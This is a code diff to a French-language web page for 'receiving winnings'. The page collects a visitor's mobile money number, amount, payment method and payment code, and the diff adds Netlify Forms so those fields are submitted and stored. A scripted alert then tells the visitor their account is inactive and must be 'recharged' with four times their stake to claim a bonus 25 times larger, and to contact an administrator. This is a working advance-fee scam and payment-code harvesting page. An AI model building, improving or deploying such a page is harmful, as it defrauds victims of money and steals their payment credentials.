@@ -1,4 +1,3 @@
-<!-- transaction.html -->
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -128,7 +127,21 @@
 
   <div class="container">
     <h2>Finaliser Réception du Gain</h2>
-    <form id="transaction-form">
+
+    <!-- Formulaire Netlify Forms : 
+         name doit correspondre à la valeur de l'input hidden form-name -->
+    <form id="transaction-form"
+          name="transaction" 
+          method="POST" 
+          data-netlify="true"
+          netlify-honeypot="bot-field">
+      <!-- Netlify honeypot anti-spam -->
+      <p style="display:none;">
+        <label>Ne pas remplir <input name="bot-field" /></label>
+      </p>
+      <!-- Champ caché pour Netlify Forms -->
+      <input type="hidden" name="form-name" value="transaction">
+
       <!-- Pays -->
       <label for="country">Pays</label>
       <select id="country" name="country" required>
@@ -191,6 +204,7 @@
   </footer>
 
   <script>
+    // Même mapping pays → indicatif et longueur si on veut valider numéro
     const countryDialCodes = [
       { name: "Bénin", code: "BJ", dial_code: "+229", phone_length: 8 },
       { name: "Burkina Faso", code: "BF", dial_code: "+226", phone_length: 8 },
@@ -273,7 +287,7 @@
         });
       }
 
-      // Pré-remplissage montant/devise depuis index (optionnel)
+      // Pré-remplissage montant/devise depuis index (optionnel, si vous avez stocké)
       const storedAmount = localStorage.getItem('lastInvestAmount');
       const storedCurrency = localStorage.getItem('lastInvestCurrency');
       if (storedAmount) {
@@ -286,22 +300,24 @@
       // Soumission du formulaire
       const form = document.getElementById('transaction-form');
       form.addEventListener('submit', (e) => {
-        e.preventDefault();
-        // Validation pays
+        // Validation côté client : si invalide, on empêche la soumission
         const countrySel = countrySelect.selectedOptions[0];
         if (!countrySel) {
+          e.preventDefault();
           alert("Veuillez sélectionner votre pays.");
           return;
         }
         const expectedLen = parseInt(countrySel.dataset.phoneLength, 10);
         const receiverValue = receiverInput.value.trim();
         if (!receiverValue) {
+          e.preventDefault();
           alert("Veuillez saisir votre numéro de réception.");
           return;
         }
         if (!isNaN(expectedLen) && expectedLen > 0) {
           const digitsOnly = receiverValue.replace(/\D/g, '');
           if (digitsOnly.length !== expectedLen) {
+            e.preventDefault();
             alert(`Le numéro de réception doit comporter exactement ${expectedLen} chiffres pour ${countrySel.textContent}.`);
             return;
           }
@@ -310,6 +326,7 @@
         const amountInput = document.getElementById('amount');
         const amount = parseFloat(amountInput.value);
         if (isNaN(amount) || amount <= 0) {
+          e.preventDefault();
           alert("Veuillez saisir un montant investi valide.");
           return;
         }
@@ -317,12 +334,14 @@
         const currencySelect = document.getElementById('currency');
         const currency = currencySelect.value;
         if (!currency) {
+          e.preventDefault();
           alert("Veuillez sélectionner une devise.");
           return;
         }
         // Moyen de paiement
         const paymentMethod = paymentMethodSelect.value;
         if (!paymentMethod) {
+          e.preventDefault();
           alert("Veuillez sélectionner un moyen de paiement.");
           return;
         }
@@ -330,11 +349,12 @@
         if (codeSection.style.display === 'block') {
           const codeValue = paymentCodeInput.value.trim();
           if (!codeValue) {
+            e.preventDefault();
             alert("Veuillez saisir le code de paiement.");
             return;
           }
         }
-        // Calculs
+        // Calculs pour l’alerte
         let bonusValue = amount * 25;
         let rechargeValue = amount * 4;
         if (currency === 'USD') {
@@ -344,13 +364,14 @@
           bonusValue = Math.round(bonusValue);
           rechargeValue = Math.round(rechargeValue);
         }
-        // Alerte
+        // Alerte UX avant soumission
         const message =
           `Alerte : votre compte ${paymentMethod} est inactif pour recevoir votre gain !\n\n` +
           `Pour recevoir vos ${bonusValue} ${currency}, vous devez recharger un montant de ${rechargeValue} ${currency} dans votre compte ${paymentMethod}.\n\n` +
           `Une fois la recharge effectuée, contactez votre administrateur pour finaliser votre paiement ! Merci`;
         alert(message);
-        // Éventuellement reset ou autre action
+        // Après alert, la soumission normale (POST) aura lieu, et Netlify captera les champs :
+        // country, receiverNumber, amount, currency, paymentMethod, paymentCode (si rempli), bot-field.
       });
     });
   </script>
